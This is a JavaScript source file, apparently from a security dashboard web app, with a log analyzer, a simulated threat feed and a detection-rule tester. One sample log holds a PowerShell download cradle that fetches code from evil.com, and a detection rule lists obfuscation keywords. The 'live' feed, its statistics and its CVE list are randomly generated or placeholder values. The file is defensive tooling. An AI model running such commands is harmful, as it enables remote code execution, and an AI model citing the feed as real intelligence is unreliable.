    _suspiciousIndicators.commandPatterns.forEach(pat => {
        if (lowerText.includes(pat.toLowerCase())) {
            findings.push({ severity: 'critical', finding: `Suspicious command pattern: ${pat.trim()}` });
        }
    });

    // Check for suspicious IPs
    _suspiciousIndicators.ips.forEach(ip => {
        if (text.includes(ip)) {
            findings.push({ severity: 'high', finding: `Known suspicious IP range: ${ip}x.x` });
        }
    });

    // Check for suspicious event IDs
    _suspiciousIndicators.events.forEach(eid => {
        if (text.includes(`EventID>${eid}<`) || text.includes(`EventID="${eid}"`) || text.includes(`EventID:${eid}`)) {
            findings.push({ severity: eid === '4625' ? 'medium' : 'high', finding: `Security-relevant Event ID: ${eid}` });
        }
    });

    // Check for suspicious AWS actions
    _suspiciousIndicators.awsActions.forEach(act => {
        if (text.includes(act)) {
            findings.push({ severity: 'critical', finding: `High-risk AWS API call: ${act}` });
        }
    });

    // CVE patterns
    _suspiciousIndicators.cvePatterns.forEach(cve => {
        if (lowerText.includes(cve.toLowerCase())) {
            findings.push({ severity: 'critical', finding: `CVE exploit pattern: ${cve}` });
        }
    });

    // MITRE mapping based on findings
    if (lowerText.includes('4625') || lowerText.includes('failed logon') || lowerText.includes('status>0xc000006d')) {
        mitreMap.push({ technique: 'T1110', name: 'Brute Force', tactic: 'Credential Access' });
    }
    if (lowerText.includes('powershell') || lowerText.includes('-enc ')) {
        mitreMap.push({ technique: 'T1059.001', name: 'PowerShell', tactic: 'Execution' });
    }
    if (lowerText.includes('4688') || lowerText.includes('newprocessname')) {
        mitreMap.push({ technique: 'T1059', name: 'Command and Scripting Interpreter', tactic: 'Execution' });
    }
    if (lowerText.includes('downloadstring') || lowerText.includes('webclient')) {
        mitreMap.push({ technique: 'T1105', name: 'Ingress Tool Transfer', tactic: 'Command and Control' });
    }
    if (lowerText.includes('mimikatz')) {
        mitreMap.push({ technique: 'T1003', name: 'OS Credential Dumping', tactic: 'Credential Access' });
    }
    if (lowerText.includes('createaccesskey')) {
        mitreMap.push({ technique: 'T1098', name: 'Account Manipulation', tactic: 'Persistence' });
    }
    if (lowerText.includes('log4j')) {
        mitreMap.push({ technique: 'T1190', name: 'Exploit Public-Facing Application', tactic: 'Initial Access' });
    }
    if (text.includes('UFW BLOCK') && text.split('UFW BLOCK').length > 3) {
        mitreMap.push({ technique: 'T1595.001', name: 'Active Scanning: Scanning IP Blocks', tactic: 'Reconnaissance' });
    }
    if (lowerText.includes('getbucketacl') || lowerText.includes('describeinstances')) {
        mitreMap.push({ technique: 'T1580', name: 'Cloud Infrastructure Discovery', tactic: 'Discovery' });
    }
    if (lowerText.includes('spring4shell')) {
        mitreMap.push({ technique: 'T1190', name: 'Exploit Public-Facing Application', tactic: 'Initial Access' });
    }
    if (lowerText.includes('winword.exe') && lowerText.includes('powershell.exe')) {
        mitreMap.push({ technique: 'T1204.002', name: 'User Execution: Malicious File', tactic: 'Execution' });
    }
    if (lowerText.includes('logontype>10') || lowerText.includes('logontype":"10')) {
        mitreMap.push({ technique: 'T1021.001', name: 'Remote Desktop Protocol', tactic: 'Lateral Movement' });
    }

    // Parse structured data for table
    let parsedRows = [];
    if (format === 'Windows Event XML') {
        const eventId = (text.match(/<EventID>(\d+)<\/EventID>/) || [])[1] || '-';
        const computer = (text.match(/<Computer>([^<]+)<\/Computer>/) || [])[1] || '-';
        const time = (text.match(/SystemTime="([^"]+)"/) || [])[1] || '-';
        const dataFields = {};
        const re = /<Data Name="([^"]+)">([^<]*)<\/Data>/g;
        let m;
        while ((m = re.exec(text)) !== null) dataFields[m[1]] = m[2];

        parsedRows.push({ 'Event ID': eventId, 'Computer': computer, 'Time': time });
        Object.keys(dataFields).forEach(k => {
            parsedRows.push({ 'Field': k, 'Value': dataFields[k] });
        });
    } else if (format === 'Syslog') {
        lines.forEach(line => {
            const parts = line.match(/^(\S+\s+\d+\s+\S+)\s+(\S+)\s+(.+)/);
            if (parts) {
                const fields = {};
                fields['Timestamp'] = parts[1];
                fields['Host'] = parts[2];
                const rest = parts[3];
                const src = (rest.match(/SRC=(\S+)/) || [])[1] || '-';
                const dst = (rest.match(/DST=(\S+)/) || [])[1] || '-';
                const dpt = (rest.match(/DPT=(\S+)/) || [])[1] || '-';
                const proto = (rest.match(/PROTO=(\S+)/) || [])[1] || '-';
                fields['Source'] = src;
                fields['Destination'] = dst;
                fields['Dest Port'] = dpt;
                fields['Protocol'] = proto;
                parsedRows.push(fields);
            }
        });
    } else if (format === 'CEF') {
        lines.forEach(line => {
            if (!line.startsWith('CEF:')) return;
            const parts = line.split('|');
            if (parts.length >= 7) {
                const fields = {
                    'Vendor': parts[1],
                    'Product': parts[2],
                    'Event': parts[4],
                    'Name': parts[5],
                    'Severity': parts[6].split(' ')[0]
                };
                const ext = parts.slice(6).join('|');
                const src = (ext.match(/src=(\S+)/) || [])[1] || '-';
                const dst = (ext.match(/dst=(\S+)/) || [])[1] || '-';
                const act = (ext.match(/act=(\S+)/) || [])[1] || '-';
                const msg = (ext.match(/msg=([^=]+?)(?:\s+\w+=|$)/) || [])[1] || '-';
                fields['Src IP'] = src;
                fields['Dst IP'] = dst;
                fields['Action'] = act;
                fields['Message'] = msg.trim();
                parsedRows.push(fields);
            }
        });
    } else if (format === 'JSON') {
        lines.forEach(line => {
            try {
                const obj = JSON.parse(line.trim());
                const fields = {};
                if (obj.eventName) fields['Event'] = obj.eventName;
                if (obj.eventTime) fields['Time'] = obj.eventTime;
                if (obj.eventSource) fields['Source'] = obj.eventSource;
                if (obj.sourceIPAddress) fields['Src IP'] = obj.sourceIPAddress;
                if (obj.userIdentity && obj.userIdentity.userName) fields['User'] = obj.userIdentity.userName;
                if (obj.userAgent) fields['User Agent'] = obj.userAgent;
                if (obj.awsRegion) fields['Region'] = obj.awsRegion;
                if (obj.requestParameters) {
                    Object.entries(obj.requestParameters).forEach(([k,v]) => {
                        fields['Param: ' + k] = typeof v === 'string' ? v : JSON.stringify(v);
                    });
                }
                parsedRows.push(fields);
            } catch(e) {}
        });
    }

    return { format, findings, mitreMap, parsedRows, lineCount: lines.length };
}

function loadLogViewer() {
    const pc = _showPageContent();
    if (_threatDashboardInterval) { clearInterval(_threatDashboardInterval); _threatDashboardInterval = null; }

    const sampleButtons = Object.keys(_sampleLogs).map(name =>
        `<button class="btn-hack" onclick="_loadSampleLog('${name}')" style="font-size:10px;padding:4px 10px">${name}</button>`
    ).join(' ');

    pc.innerHTML = `
        <div style="margin-bottom:24px">
            <div style="display:flex;align-items:center;gap:12px;margin-bottom:8px">
                <h1 style="margin:0;border:none;padding:0">LOG VIEWER & ANALYZER</h1>
                <span class="card-tag" style="position:static">ANALYSIS</span>
            </div>
            <p style="color:var(--text-secondary);font-size:13px">Paste log entries for automatic format detection, parsing, suspicious field highlighting, and MITRE ATT&CK mapping.</p>
        </div>

        <div class="section-title">&#x27E6; SAMPLE LOGS &#x27E7;</div>
        <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px">${sampleButtons}</div>

        <div class="section-title">&#x27E6; LOG INPUT &#x27E7;</div>
        <textarea id="log-input" placeholder="Paste your log entries here (Windows Event XML, Syslog, CEF, JSON, CSV)..." style="width:100%;height:200px;background:var(--bg-primary);border:1px solid var(--border);color:var(--text-primary);padding:12px;font-family:var(--font-mono);font-size:11px;border-radius:4px;resize:vertical;outline:none;margin-bottom:12px"></textarea>
        <div style="display:flex;gap:8px;margin-bottom:16px">
            <button class="btn-hack" onclick="_analyzeLogInput()">ANALYZE LOGS</button>
            <button class="btn-hack" onclick="document.getElementById('log-input').value='';document.getElementById('log-results').innerHTML=''">CLEAR</button>
        </div>

        <div id="log-results"></div>
    `;
}

function _loadSampleLog(name) {
    document.getElementById('log-input').value = _sampleLogs[name];
    _analyzeLogInput();
}

function _analyzeLogInput() {
    const text = document.getElementById('log-input').value.trim();
    if (!text) return;

    const result = _parseAndAnalyzeLogs(text);
    const el = document.getElementById('log-results');

    // Format detection
    let html = `
        <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:16px;margin-bottom:16px">
            <div style="display:flex;gap:16px;align-items:center">
                <div>
                    <div style="font-size:10px;color:var(--text-dim)">DETECTED FORMAT</div>
                    <div style="font-size:16px;color:var(--accent)">${result.format}</div>
                </div>
                <div>
                    <div style="font-size:10px;color:var(--text-dim)">LINES PARSED</div>
                    <div style="font-size:16px;color:var(--accent-blue)">${result.lineCount}</div>
                </div>
                <div>
                    <div style="font-size:10px;color:var(--text-dim)">FINDINGS</div>
                    <div style="font-size:16px;color:${result.findings.length > 0 ? 'var(--accent-red)' : 'var(--accent)'}">${result.findings.length}</div>
                </div>
                <div>
                    <div style="font-size:10px;color:var(--text-dim)">MITRE TECHNIQUES</div>
                    <div style="font-size:16px;color:var(--accent-yellow)">${result.mitreMap.length}</div>
                </div>
            </div>
        </div>
    `;

    // Findings
    if (result.findings.length > 0) {
        html += `<div class="section-title">&#x27E6; SUSPICIOUS FINDINGS &#x27E7;</div>
            <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:16px">
            ${result.findings.map(f => {
                const color = f.severity === 'critical' ? 'var(--accent-red)' : f.severity === 'high' ? 'var(--accent-yellow)' : 'var(--accent-blue)';
                return `<div style="padding:4px 0;font-size:12px;display:flex;gap:8px;align-items:center">
                    <span style="font-size:9px;padding:1px 6px;border-radius:2px;background:${color};color:#000;font-weight:700;flex-shrink:0">${f.severity.toUpperCase()}</span>
                    <span>${_esc(f.finding)}</span>
                </div>`;
            }).join('')}
            </div>`;
    }

    // MITRE mapping
    if (result.mitreMap.length > 0) {
        html += `<div class="section-title">&#x27E6; MITRE ATT&CK MAPPING &#x27E7;</div>
            <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:16px">
            <table style="width:100%;font-size:12px;border-collapse:collapse">
                <tr style="border-bottom:1px solid var(--border)">
                    <th style="text-align:left;padding:4px 8px;color:var(--accent)">Technique</th>
                    <th style="text-align:left;padding:4px 8px;color:var(--accent)">Name</th>
                    <th style="text-align:left;padding:4px 8px;color:var(--accent)">Tactic</th>
                </tr>
                ${result.mitreMap.map(m => `<tr style="border-bottom:1px solid var(--border)">
                    <td style="padding:4px 8px;color:var(--accent-yellow)">${m.technique}</td>
                    <td style="padding:4px 8px">${m.name}</td>
                    <td style="padding:4px 8px;color:var(--accent-blue)">${m.tactic}</td>
                </tr>`).join('')}
            </table>
            </div>`;
    }

    // Parsed table
    if (result.parsedRows.length > 0) {
        const allKeys = [];
        result.parsedRows.forEach(row => {
            Object.keys(row).forEach(k => { if (!allKeys.includes(k)) allKeys.push(k); });
        });

        html += `<div class="section-title">&#x27E6; PARSED LOG DATA &#x27E7;</div>
            <div style="overflow-x:auto;background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:16px">
            <table style="width:100%;font-size:11px;border-collapse:collapse">
                <tr style="border-bottom:1px solid var(--border)">
                    ${allKeys.map(k => `<th style="text-align:left;padding:4px 6px;color:var(--accent);white-space:nowrap">${_esc(k)}</th>`).join('')}
                </tr>
                ${result.parsedRows.map(row => `<tr style="border-bottom:1px solid var(--border)">
                    ${allKeys.map(k => {
                        let val = row[k] || '-';
                        let style = 'padding:4px 6px;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap';
                        // Highlight suspicious values
                        const lv = val.toLowerCase();
                        if (_suspiciousIndicators.processes.some(p => lv.includes(p.toLowerCase()))) style += ';color:var(--accent-red);font-weight:700';
                        else if (_suspiciousIndicators.ips.some(ip => val.includes(ip))) style += ';color:var(--accent-yellow);font-weight:700';
                        else if (_suspiciousIndicators.awsActions.some(a => val === a)) style += ';color:var(--accent-red);font-weight:700';
                        else if (val === '4625' || val === '4688') style += ';color:var(--accent-yellow)';
                        return `<td style="${style}" title="${_esc(val)}">${_esc(val)}</td>`;
                    }).join('')}
                </tr>`).join('')}
            </table>
            </div>`;
    }

    el.innerHTML = html;
}


// ═══════════════════════════════════════════════════════════════════════════
// 3. LIVE THREAT FEED DASHBOARD
// ═══════════════════════════════════════════════════════════════════════════

function _rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function _pick(arr) { return arr[_rand(0, arr.length - 1)]; }

const _threatFeedData = {
    actors: [
        { name: 'APT28 (Fancy Bear)', nation: 'Russia', targets: 'Government, Defense, Media', active: true },
        { name: 'APT29 (Cozy Bear)', nation: 'Russia', targets: 'Government, Think Tanks, Healthcare', active: true },
        { name: 'Lazarus Group', nation: 'North Korea', targets: 'Finance, Crypto, Aerospace', active: true },
        { name: 'APT41 (Winnti)', nation: 'China', targets: 'Technology, Healthcare, Telecom', active: true },
        { name: 'Sandworm', nation: 'Russia', targets: 'Energy, Government, Critical Infrastructure', active: true },
        { name: 'FIN7', nation: 'Russia', targets: 'Retail, Hospitality, Finance', active: false },
        { name: 'Kimsuky', nation: 'North Korea', targets: 'Research, Policy, Nuclear', active: true },
        { name: 'Turla', nation: 'Russia', targets: 'Government, Diplomatic, Military', active: false },
        { name: 'Volt Typhoon', nation: 'China', targets: 'Critical Infrastructure, Telecom, Utilities', active: true },
        { name: 'Scattered Spider', nation: 'Multi', targets: 'Telecom, Tech, Finance, Entertainment', active: true }
    ],
    malwareFamilies: [
        { name: 'LockBit 3.0', type: 'Ransomware', trend: 'rising', samples: _rand(200,500) },
        { name: 'BlackCat/ALPHV', type: 'Ransomware', trend: 'stable', samples: _rand(100,300) },
        { name: 'Emotet', type: 'Loader/Botnet', trend: 'rising', samples: _rand(300,700) },
        { name: 'QakBot', type: 'Banking Trojan', trend: 'declining', samples: _rand(80,200) },
        { name: 'Cobalt Strike', type: 'C2 Framework', trend: 'stable', samples: _rand(400,900) },
        { name: 'AsyncRAT', type: 'RAT', trend: 'rising', samples: _rand(150,400) },
        { name: 'AgentTesla', type: 'Infostealer', trend: 'stable', samples: _rand(200,500) },
        { name: 'RedLine', type: 'Infostealer', trend: 'rising', samples: _rand(300,600) },
        { name: 'IcedID', type: 'Banking Trojan', trend: 'declining', samples: _rand(50,150) },
        { name: 'Sliver', type: 'C2 Framework', trend: 'rising', samples: _rand(100,250) }
    ],
    cves: [
        { id: 'CVE-2026-21413', product: 'Microsoft Exchange Server', cvss: 9.8, exploited: true },
        { id: 'CVE-2026-20198', product: 'Cisco IOS XE', cvss: 10.0, exploited: true },
        { id: 'CVE-2026-4466', product: 'Ivanti Connect Secure', cvss: 9.1, exploited: true },
        { id: 'CVE-2026-27350', product: 'Apache HTTP Server', cvss: 8.6, exploited: false },
        { id: 'CVE-2026-0291', product: 'VMware vCenter Server', cvss: 9.8, exploited: true },
        { id: 'CVE-2026-33891', product: 'Fortinet FortiOS', cvss: 9.3, exploited: true },
        { id: 'CVE-2026-1234', product: 'Palo Alto PAN-OS', cvss: 9.0, exploited: false },
        { id: 'CVE-2026-5678', product: 'Atlassian Confluence', cvss: 8.8, exploited: true },
        { id: 'CVE-2026-8901', product: 'Citrix NetScaler', cvss: 9.4, exploited: true },
        { id: 'CVE-2026-12345', product: 'Linux Kernel', cvss: 7.8, exploited: false }
    ]
};

const _feedEvents = [
    { sev: 'critical', tpl: 'CISA KEV: {cve} actively exploited in the wild - {product}' },
    { sev: 'critical', tpl: 'Ransomware alert: {malware} operator claims new victim in {sector}' },
    { sev: 'high', tpl: 'abuse.ch: {count} new {malware} C2 indicators published' },
    { sev: 'high', tpl: 'ThreatFox: {actor} associated IOC cluster - {count} new indicators' },
    { sev: 'high', tpl: 'MalwareBazaar: New {malware} sample submitted - SHA256 tracked' },
    { sev: 'medium', tpl: 'URLhaus: {count} new malicious URLs added from {malware} campaign' },
    { sev: 'medium', tpl: 'MITRE ATT&CK: Technique {technique} updated with new sub-techniques' },
    { sev: 'high', tpl: 'AlienVault OTX: {actor} pulse updated with {count} new indicators' },
    { sev: 'critical', tpl: 'FeodoTracker: {count} new C2 servers identified for {malware}' },
    { sev: 'low', tpl: 'NVD: {count} new CVEs published - {critical} critical, {high} high severity' },
    { sev: 'high', tpl: 'Emerging Threats: {count} new Suricata/Snort rules for {malware}' },
    { sev: 'medium', tpl: 'SSL Blacklist: {count} new malicious SSL certificates flagged' },
    { sev: 'critical', tpl: 'CERT alert: Active exploitation of {cve} targeting {sector} organizations' },
    { sev: 'high', tpl: 'Shodan: Mass scanning detected targeting port {port} ({service})' },
    { sev: 'medium', tpl: 'PhishTank: {count} new verified phishing URLs - {brand} impersonation' }
];

function _generateFeedEvent() {
    const tpl = _pick(_feedEvents);
    const sectors = ['Healthcare', 'Finance', 'Government', 'Education', 'Manufacturing', 'Energy', 'Retail', 'Technology'];
    const techniques = ['T1059.001', 'T1547.001', 'T1055', 'T1027', 'T1070', 'T1562.001', 'T1003', 'T1110'];
    const brands = ['Microsoft', 'DocuSign', 'Amazon', 'PayPal', 'DHL', 'Google', 'LinkedIn', 'Apple'];
    const ports = [{ port: 443, svc: 'HTTPS' }, { port: 22, svc: 'SSH' }, { port: 3389, svc: 'RDP' }, { port: 445, svc: 'SMB' }, { port: 8080, svc: 'HTTP-Alt' }];
    const p = _pick(ports);

    let msg = tpl.tpl
        .replace('{cve}', _pick(_threatFeedData.cves).id)
        .replace('{product}', _pick(_threatFeedData.cves).product)
        .replace('{malware}', _pick(_threatFeedData.malwareFamilies).name)
        .replace('{actor}', _pick(_threatFeedData.actors).name)
        .replace('{sector}', _pick(sectors))
        .replace('{technique}', _pick(techniques))
        .replace('{brand}', _pick(brands))
        .replace('{port}', p.port)
        .replace('{service}', p.svc)
        .replace(/\{count\}/g, _rand(3, 200))
        .replace('{critical}', _rand(2, 15))
        .replace('{high}', _rand(10, 40));

    return { sev: tpl.sev, msg, time: new Date().toISOString().substring(11, 19) };
}

function loadThreatDashboard() {
    const pc = _showPageContent();
    if (_threatDashboardInterval) { clearInterval(_threatDashboardInterval); _threatDashboardInterval = null; }

    const totalIOCs = _rand(1200, 3500);
    const critAlerts = _rand(12, 48);
    const activeCampaigns = _rand(5, 18);
    const blockedIPs = _rand(850, 2200);

    const asciiMap = `
    .---.                                              .---.
   /     \\      .--.                                  /     \\
  | NA    |    /  EU \\    .---.     .---.            |  AS   |
  | [42]  |   | [38] |  / MID  \\  / RUS  \\          | [31]  |
   \\     /    | [+12] | | [15]  || [28]   |          \\     /
    '---'      \\    /   \\      /  \\      /            '---'
                '--'     '---'    '---'
                     .---.                    .---.
                    / AF  \\                  / OC  \\
                   | [8]   |                | [3]   |
                    \\     /                  \\     /
                     '---'        .---.       '---'
                                 / SA  \\
                                | [11]  |
                                 \\     /
                                  '---'
    Legend: [n] = Active threat origins today`;

    // Generate initial feed
    const initialFeed = [];
    for (let i = 0; i < 10; i++) initialFeed.push(_generateFeedEvent());

    pc.innerHTML = `
        <div style="margin-bottom:24px">
            <div style="display:flex;align-items:center;gap:12px;margin-bottom:8px">
                <h1 style="margin:0;border:none;padding:0">LIVE THREAT FEED DASHBOARD</h1>
                <span class="card-tag" style="position:static;background:var(--accent-red);color:#fff">LIVE</span>
            </div>
            <p style="color:var(--text-secondary);font-size:13px">Real-time threat intelligence feed with IOC statistics, active campaigns, and global threat distribution. Auto-refreshes every 5 seconds.</p>
        </div>

        <div class="stats-grid" style="grid-template-columns:repeat(4,1fr)">
            <div class="stat-card">
                <div class="stat-number" id="td-total-iocs" style="color:var(--accent)">${totalIOCs}</div>
                <div class="stat-label">IOCs TODAY</div>
                <div class="stat-bar"><div class="stat-fill" style="width:${Math.min(100, totalIOCs/35)}%"></div></div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="td-crit-alerts" style="color:var(--accent-red)">${critAlerts}</div>
                <div class="stat-label">CRITICAL ALERTS</div>
                <div class="stat-bar"><div class="stat-fill warn" style="width:${Math.min(100, critAlerts*2.5)}%"></div></div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="td-campaigns" style="color:var(--accent-yellow)">${activeCampaigns}</div>
                <div class="stat-label">ACTIVE CAMPAIGNS</div>
                <div class="stat-bar"><div class="stat-fill" style="width:${Math.min(100, activeCampaigns*6)}%"></div></div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="td-blocked" style="color:var(--accent-blue)">${blockedIPs}</div>
                <div class="stat-label">IPs BLOCKED</div>
                <div class="stat-bar"><div class="stat-fill" style="width:${Math.min(100, blockedIPs/22)}%"></div></div>
            </div>
        </div>

        <div style="display:flex;gap:16px;margin-top:16px">
            <div style="flex:1">
                <div class="section-title">&#x27E6; THREAT FEED &#x27E7;</div>
                <div style="display:flex;gap:8px;margin-bottom:8px">
                    <button class="btn-hack" onclick="_filterThreatFeed('all')" style="font-size:10px;padding:3px 8px">ALL</button>
                    <button class="btn-hack" onclick="_filterThreatFeed('critical')" style="font-size:10px;padding:3px 8px;color:var(--accent-red)">CRITICAL</button>
                    <button class="btn-hack" onclick="_filterThreatFeed('high')" style="font-size:10px;padding:3px 8px;color:var(--accent-yellow)">HIGH</button>
                    <button class="btn-hack" onclick="_filterThreatFeed('medium')" style="font-size:10px;padding:3px 8px;color:var(--accent-blue)">MEDIUM</button>
                    <button class="btn-hack" onclick="_filterThreatFeed('low')" style="font-size:10px;padding:3px 8px;color:var(--accent)">LOW</button>
                </div>
                <div id="td-feed" style="max-height:350px;overflow-y:auto;background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:8px">
                    ${initialFeed.map(e => `<div class="feed-item" data-sev="${e.sev}">
                        <span class="feed-time">${e.time}</span>
                        <span class="feed-severity ${e.sev}">${e.sev.toUpperCase().substring(0,4)}</span>
                        <span class="feed-msg">${e.msg}</span>
                    </div>`).join('')}
                </div>
            </div>

            <div style="width:320px;flex-shrink:0">
                <div class="section-title">&#x27E6; GEOGRAPHIC DISTRIBUTION &#x27E7;</div>
                <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:16px">
                    <pre style="font-size:9px;line-height:1.4;color:var(--accent);white-space:pre">${asciiMap}</pre>
                </div>
            </div>
        </div>

        <div style="display:flex;gap:16px;margin-top:16px">
            <div style="flex:1">
                <div class="section-title">&#x27E6; TOP THREAT ACTORS &#x27E7;</div>
                <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px">
                    <table style="width:100%;font-size:11px;border-collapse:collapse">
                        <tr style="border-bottom:1px solid var(--border)">
                            <th style="text-align:left;padding:4px 6px;color:var(--accent)">Actor</th>
                            <th style="text-align:left;padding:4px 6px;color:var(--accent)">Nation</th>
                            <th style="text-align:left;padding:4px 6px;color:var(--accent)">Targets</th>
                            <th style="text-align:left;padding:4px 6px;color:var(--accent)">Status</th>
                        </tr>
                        ${_threatFeedData.actors.map(a => `<tr style="border-bottom:1px solid var(--border)">
                            <td style="padding:4px 6px;color:var(--accent-blue)">${a.name}</td>
                            <td style="padding:4px 6px">${a.nation}</td>
                            <td style="padding:4px 6px;color:var(--text-secondary);font-size:10px">${a.targets}</td>
                            <td style="padding:4px 6px"><span style="color:${a.active ? 'var(--accent-red)' : 'var(--text-dim)'}">${a.active ? 'ACTIVE' : 'DORMANT'}</span></td>
                        </tr>`).join('')}
                    </table>
                </div>
            </div>
            <div style="flex:1">
                <div class="section-title">&#x27E6; TRENDING MALWARE FAMILIES &#x27E7;</div>
                <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px">
                    <table style="width:100%;font-size:11px;border-collapse:collapse">
                        <tr style="border-bottom:1px solid var(--border)">
                            <th style="text-align:left;padding:4px 6px;color:var(--accent)">Family</th>
                            <th style="text-align:left;padding:4px 6px;color:var(--accent)">Type</th>
                            <th style="text-align:left;padding:4px 6px;color:var(--accent)">Trend</th>
                            <th style="text-align:left;padding:4px 6px;color:var(--accent)">Samples</th>
                        </tr>
                        ${_threatFeedData.malwareFamilies.map(m => {
                            const trendColor = m.trend === 'rising' ? 'var(--accent-red)' : m.trend === 'declining' ? 'var(--accent)' : 'var(--accent-yellow)';
                            const trendIcon = m.trend === 'rising' ? '&#x25B2;' : m.trend === 'declining' ? '&#x25BC;' : '&#x25C6;';
                            return `<tr style="border-bottom:1px solid var(--border)">
                                <td style="padding:4px 6px;color:var(--accent-yellow)">${m.name}</td>
                                <td style="padding:4px 6px;color:var(--text-secondary)">${m.type}</td>
                                <td style="padding:4px 6px;color:${trendColor}">${trendIcon} ${m.trend}</td>
                                <td style="padding:4px 6px">${m.samples}</td>
                            </tr>`;
                        }).join('')}
                    </table>
                </div>
            </div>
        </div>

        <div class="section-title" style="margin-top:16px">&#x27E6; CVE TRACKER - LATEST VULNERABILITIES &#x27E7;</div>
        <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px">
            <table style="width:100%;font-size:11px;border-collapse:collapse">
                <tr style="border-bottom:1px solid var(--border)">
                    <th style="text-align:left;padding:4px 8px;color:var(--accent)">CVE ID</th>
                    <th style="text-align:left;padding:4px 8px;color:var(--accent)">Product</th>
                    <th style="text-align:left;padding:4px 8px;color:var(--accent)">CVSS</th>
                    <th style="text-align:left;padding:4px 8px;color:var(--accent)">Exploited</th>
                </tr>
                ${_threatFeedData.cves.map(c => {
                    const cvssColor = c.cvss >= 9 ? 'var(--accent-red)' : c.cvss >= 7 ? 'var(--accent-yellow)' : 'var(--accent-blue)';
                    return `<tr style="border-bottom:1px solid var(--border)">
                        <td style="padding:4px 8px;color:var(--accent-blue)">${c.id}</td>
                        <td style="padding:4px 8px">${c.product}</td>
                        <td style="padding:4px 8px;color:${cvssColor};font-weight:700">${c.cvss}</td>
                        <td style="padding:4px 8px"><span style="color:${c.exploited ? 'var(--accent-red)' : 'var(--text-dim)'}">${c.exploited ? 'YES - IN THE WILD' : 'No'}</span></td>
                    </tr>`;
                }).join('')}
            </table>
        </div>
    `;

    // Auto-refresh feed
    _threatDashboardInterval = setInterval(() => {
        const feed = document.getElementById('td-feed');
        if (!feed) { clearInterval(_threatDashboardInterval); _threatDashboardInterval = null; return; }

        const evt = _generateFeedEvent();
        const div = document.createElement('div');
        div.className = 'feed-item';
        div.setAttribute('data-sev', evt.sev);
        div.innerHTML = `
            <span class="feed-time">${evt.time}</span>
            <span class="feed-severity ${evt.sev}">${evt.sev.toUpperCase().substring(0,4)}</span>
            <span class="feed-msg">${evt.msg}</span>
        `;
        feed.insertBefore(div, feed.firstChild);
        if (feed.children.length > 50) feed.removeChild(feed.lastChild);

        // Update stats
        const el1 = document.getElementById('td-total-iocs');
        const el2 = document.getElementById('td-crit-alerts');
        if (el1) el1.textContent = parseInt(el1.textContent) + _rand(1, 8);
        if (el2 && evt.sev === 'critical') el2.textContent = parseInt(el2.textContent) + 1;
    }, 5000);
}

function _filterThreatFeed(severity) {
    const items = document.querySelectorAll('#td-feed .feed-item');
    items.forEach(item => {
        if (severity === 'all') {
            item.style.display = '';
        } else {
            item.style.display = item.getAttribute('data-sev') === severity ? '' : 'none';
        }
    });
}


// ═══════════════════════════════════════════════════════════════════════════
// 4. DETECTION RULE TESTER
// ═══════════════════════════════════════════════════════════════════════════

const _exampleRules = {
    'Splunk - Failed Logon Brute Force': {
        platform: 'splunk',
        rule: `index=wineventlog EventCode=4625
| stats count as FailedAttempts, dc(TargetUserName) as UniqueUsers, values(TargetUserName) as Targets by IpAddress, _time span=5m
| where FailedAttempts >= 5
| eval Severity=case(FailedAttempts>20,"Critical",FailedAttempts>10,"High",1=1,"Medium")`,
        logs: `2026-03-29T14:23:17 EventCode=4625 TargetUserName=administrator IpAddress=192.168.1.105 WorkstationName=ATTACKER-PC LogonType=10
2026-03-29T14:23:18 EventCode=4625 TargetUserName=admin IpAddress=192.168.1.105 WorkstationName=ATTACKER-PC LogonType=10
2026-03-29T14:23:19 EventCode=4625 TargetUserName=administrator IpAddress=192.168.1.105 WorkstationName=ATTACKER-PC LogonType=10
2026-03-29T14:23:20 EventCode=4625 TargetUserName=svc_backup IpAddress=192.168.1.105 WorkstationName=ATTACKER-PC LogonType=10
2026-03-29T14:23:21 EventCode=4625 TargetUserName=administrator IpAddress=192.168.1.105 WorkstationName=ATTACKER-PC LogonType=10
2026-03-29T14:23:22 EventCode=4625 TargetUserName=root IpAddress=192.168.1.105 WorkstationName=ATTACKER-PC LogonType=10
2026-03-29T14:23:23 EventCode=4624 TargetUserName=jsmith IpAddress=10.0.1.50 WorkstationName=WS042 LogonType=3
2026-03-29T14:23:24 EventCode=4625 TargetUserName=administrator IpAddress=192.168.1.105 WorkstationName=ATTACKER-PC LogonType=10
2026-03-29T14:23:25 EventCode=4625 TargetUserName=sa IpAddress=192.168.1.105 WorkstationName=ATTACKER-PC LogonType=10`
    },
    'Sentinel KQL - Suspicious PowerShell': {
        platform: 'sentinel',
        rule: `SecurityEvent
| where EventID == 4688
| where Process has "powershell.exe"
| where CommandLine has_any ("-enc", "-nop", "-w hidden", "downloadstring", "invoke-expression", "bypass", "frombase64")
| project TimeGenerated, Computer, Account, CommandLine, ParentProcessName`,
        logs: `2026-03-29T15:01:44 EventID=4688 Process=powershell.exe CommandLine="powershell.exe -nop -w hidden -enc aQBlAHgA..." ParentProcessName=WINWORD.EXE Computer=WS042 Account=CORP\\jsmith
2026-03-29T15:02:10 EventID=4688 Process=powershell.exe CommandLine="powershell.exe Get-Process" ParentProcessName=explorer.exe Computer=WS010 Account=CORP\\admin
2026-03-29T15:03:22 EventID=4688 Process=powershell.exe CommandLine="powershell.exe -nop -exec bypass -c IEX(New-Object Net.WebClient).downloadstring('http://evil.com/p.ps1')" ParentProcessName=cmd.exe Computer=DC01 Account=CORP\\svc_sql
2026-03-29T15:04:01 EventID=4688 Process=notepad.exe CommandLine="notepad.exe C:\\Users\\jdoe\\notes.txt" ParentProcessName=explorer.exe Computer=WS015 Account=CORP\\jdoe
